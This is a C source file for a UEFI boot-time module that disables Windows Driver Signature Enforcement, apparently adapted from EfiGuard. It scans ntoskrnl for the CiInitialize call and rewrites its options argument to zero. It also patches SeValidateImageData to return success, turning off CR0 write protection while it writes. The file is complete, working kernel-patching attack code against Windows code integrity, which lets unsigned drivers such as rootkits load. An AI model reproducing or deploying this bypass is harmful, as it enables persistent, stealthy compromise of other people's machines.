/** @file
  DSE (Driver Signature Enforcement) bypass implementation.

  Strategy (EfiGuard-derived): Patch ntoskrnl.exe's SepInitializeCodeIntegrity
  to pass 0 as the CiOptions parameter to CiInitialize. This prevents DSE
  from being armed. Also patches SeValidateImageData to return STATUS_SUCCESS.

  Key insight: g_CiOptions lives in NTOSKRNL, not CI.dll. CiInitialize receives
  a pointer to g_CiOptions and the desired options value. By zeroing the value
  parameter (ECX), CiInitialize sets g_CiOptions = 0 = no enforcement.

  Algorithm:
  1. Find ntoskrnl's IAT entry for CI.dll!CiInitialize
  2. Scan PAGE section for CALL/JMP [rip+disp32] targeting that IAT entry
  3. Scan backward from CALL for the last MOV ECX instruction (CI options param)
  4. Patch MOV ECX to XOR ECX, ECX (2 bytes: 31 C9)
  5. Scan PAGE for MOV EAX, 0xC0000428 (STATUS_INVALID_IMAGE_HASH) in
     SeValidateImageData, patch to MOV EAX, 0
**/

#include "PatchDse.h"
#include "PeUtils.h"
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>

//
// Forward declarations for debug logging (defined in DioProcessEfi.c)
//
extern VOID DebugAppend(IN CONST CHAR16 *Str);
extern VOID DebugAppendHex(IN UINT64 Value);

BOOLEAN
PatchDse(
    IN VOID  *NtoskrnlBase,
    IN UINTN NtoskrnlSize
    )
{
    VOID              *CiInitIATEntry;
    PE_SECTION_HEADER *PageSect;
    UINT8             *PageBase;
    UINTN              PageSize;
    BOOLEAN            CiPatched = FALSE;
    UINTN              i;

    if (NtoskrnlBase == NULL || NtoskrnlSize == 0) {
        return FALSE;
    }

    //
    // Step 1: Find ntoskrnl's IAT entry for CI.dll!CiInitialize
    //
    CiInitIATEntry = PeFindIATEntry(NtoskrnlBase, "CI.dll", "CiInitialize");
    if (CiInitIATEntry == NULL) {
        DebugAppend(L"IAT:NF ");
        return FALSE;
    }
    DebugAppend(L"IAT:");
    DebugAppendHex((UINT64)(UINTN)CiInitIATEntry);
    DebugAppend(L" ");

    //
    // Step 2: Find PAGE section (SepInitializeCodeIntegrity lives here)
    //
    PageSect = PeFindSection(NtoskrnlBase, "PAGE");
    if (PageSect == NULL) {
        DebugAppend(L"PAGE:NF ");
        return FALSE;
    }
    PageBase = (UINT8 *)NtoskrnlBase + PageSect->VirtualAddress;
    PageSize = PageSect->SizeOfRawData;

    //
    // Step 3: Scan PAGE for CALL/JMP [rip+disp32] targeting CiInitialize IAT
    //
    // Encodings:
    //   FF 15 xx xx xx xx       = CALL [rip+disp32] (6 bytes) — Win10 RS3+
    //   48 FF 25 xx xx xx xx    = JMP  [rip+disp32] (7 bytes) — Win8-Win10 1703
    //   FF 25 xx xx xx xx       = JMP  [rip+disp32] (6 bytes) — some builds
    //
    for (i = 0; i < PageSize - 7; i++) {
        UINT8  *Addr = PageBase + i;
        INT32   Disp;
        UINTN   InsnLen;
        VOID   *Target;

        if (Addr[0] == 0xFF && Addr[1] == 0x15) {
            // CALL [rip+disp32] — 6 bytes
            Disp = *(INT32 *)(Addr + 2);
            InsnLen = 6;
        } else if (Addr[0] == 0x48 && Addr[1] == 0xFF && Addr[2] == 0x25) {
            // REX.W JMP [rip+disp32] — 7 bytes
            Disp = *(INT32 *)(Addr + 3);
            InsnLen = 7;
        } else if (Addr[0] == 0xFF && Addr[1] == 0x25) {
            // JMP [rip+disp32] — 6 bytes
            Disp = *(INT32 *)(Addr + 2);
            InsnLen = 6;
        } else {
            continue;
        }

        Target = (VOID *)(Addr + InsnLen + Disp);
        if (Target != CiInitIATEntry) continue;

        // Found the CALL/JMP to CiInitialize!
        DebugAppend(L"CALL@");
        DebugAppendHex((UINT64)(UINTN)Addr);
        DebugAppend(L" ");

        //
        // Step 4: Scan backward for last MOV ECX, xxx
        //
        // Looking for the instruction that sets the first parameter (ECX in x64 fastcall).
        // EfiGuard specifically looks for 2-byte MOV ECX instructions:
        //   8B C8 = MOV ECX, EAX
        //   8B C? = MOV ECX, REG32 (where ? is C0-CF)
        //   B9 xx xx xx xx = MOV ECX, imm32 (5 bytes)
        //   33 C9 = XOR ECX, ECX (already zeroed - nothing to do)
        //
        {
            INT32 Back;
            for (Back = 2; Back < 40; Back++) {
                UINT8 *MaybeMov = Addr - Back;

                // 2-byte MOV ECX, REG32: 8B C0-CF
                if (MaybeMov[0] == 0x8B && (MaybeMov[1] & 0xF8) == 0xC8) {
                    UINT64 Cr0 = AsmReadCr0();
                    AsmWriteCr0(Cr0 & ~((UINT64)0x10000));
                    MaybeMov[0] = 0x31;  // XOR ECX, ECX
                    MaybeMov[1] = 0xC9;
                    AsmWriteCr0(Cr0);
                    DebugAppend(L"MOV2@");
                    DebugAppendHex((UINT64)(UINTN)MaybeMov);
                    DebugAppend(L" ");
                    CiPatched = TRUE;
                    break;
                }

                // 5-byte MOV ECX, imm32: B9 xx xx xx xx
                if (Back >= 5 && MaybeMov[0] == 0xB9) {
                    UINT64 Cr0 = AsmReadCr0();
                    AsmWriteCr0(Cr0 & ~((UINT64)0x10000));
                    MaybeMov[0] = 0x31;  // XOR ECX, ECX
                    MaybeMov[1] = 0xC9;
                    MaybeMov[2] = 0x90;  // NOP
                    MaybeMov[3] = 0x90;  // NOP
                    MaybeMov[4] = 0x90;  // NOP
                    AsmWriteCr0(Cr0);
                    DebugAppend(L"MOV5@");
                    DebugAppendHex((UINT64)(UINTN)MaybeMov);
                    DebugAppend(L" ");
                    CiPatched = TRUE;
                    break;
                }

                // Already XOR ECX, ECX (33 C9) — nothing to patch
                if (MaybeMov[0] == 0x33 && MaybeMov[1] == 0xC9) {
                    DebugAppend(L"ALREADY0 ");
                    CiPatched = TRUE;
                    break;
                }
            }

            if (!CiPatched) {
                DebugAppend(L"MOV:NF ");
            }
        }

        break;  // Only patch the first CALL to CiInitialize
    }

    if (!CiPatched && i >= PageSize - 7) {
        DebugAppend(L"CALL:NF ");
    }

    //
    // Step 5: Patch SeValidateImageData
    //
    // SeValidateImageData returns STATUS_INVALID_IMAGE_HASH (0xC0000428)
    // when validation fails. Patch to return STATUS_SUCCESS (0).
    //
    // Pattern: B8 28 04 00 C0 (MOV EAX, 0xC0000428) followed by EB/E9/C3
    //
    for (i = 0; i < PageSize - 6; i++) {
        UINT8 *Addr = PageBase + i;
        if (Addr[0] == 0xB8 && Addr[1] == 0x28 && Addr[2] == 0x04 &&
            Addr[3] == 0x00 && Addr[4] == 0xC0) {
            // Verify next byte is JMP rel8, JMP rel32, or RET
            if (Addr[5] == 0xEB || Addr[5] == 0xE9 || Addr[5] == 0xC3) {
                UINT64 Cr0 = AsmReadCr0();
                AsmWriteCr0(Cr0 & ~((UINT64)0x10000));
                // Patch to MOV EAX, 0 (STATUS_SUCCESS)
                Addr[1] = 0x00;
                Addr[2] = 0x00;
                Addr[3] = 0x00;
                Addr[4] = 0x00;
                AsmWriteCr0(Cr0);
                DebugAppend(L"SVID ");
                break;
            }
        }
    }

    return CiPatched;
}
